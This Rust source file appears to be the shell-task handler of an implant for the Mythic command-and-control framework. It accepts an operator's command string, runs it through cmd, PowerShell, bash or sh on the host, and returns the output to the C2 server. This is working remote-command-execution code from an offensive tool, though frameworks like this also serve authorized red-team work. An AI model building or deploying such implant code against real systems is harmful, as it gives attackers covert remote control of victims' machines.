use std::process::Command;

use mythic::{TaskMessage, TaskResponse};
use serde::Deserialize;

use crate::sys::encoding::decode_output;

#[derive(Deserialize)]
struct Params {
    command: String,
    #[serde(default = "default_shell")]
    shell: String,
}

fn default_shell() -> String {
    if cfg!(windows) { "cmd".into() } else { "sh".into() }
}

pub fn handle(task: &TaskMessage) -> TaskResponse {
    match serde_json::from_str::<Params>(&task.parameters) {
        Ok(p) => {
            // Note: no timeout — Command::output() blocks until the child exits
            let (bin, flag) = match p.shell.as_str() {
                "cmd" => ("cmd", "/c"),
                "powershell" => ("powershell", "-Command"),
                "bash" => ("bash", "-c"),
                "sh" | _ => ("sh", "-c"),
            };
            match Command::new(bin).arg(flag).arg(&p.command).output() {
                Ok(out) => {
                    let stdout = decode_output(&out.stdout);
                    let stderr = decode_output(&out.stderr);
                    let output = if stderr.is_empty() {
                        stdout
                    } else {
                        format!("{stdout}\n{stderr}")
                    };
                    TaskResponse {
                        task_id: task.id,
                        completed: Some(true),
                        status: Some("completed".into()),
                        user_output: Some(output),
                        ..Default::default()
                    }
                }
                Err(e) => TaskResponse::failed(task.id, &format!("{} failed: {e}", bin)),
            }
        }
        Err(e) => TaskResponse::failed(task.id, &format!("shell parse error: {e}")),
    }
}
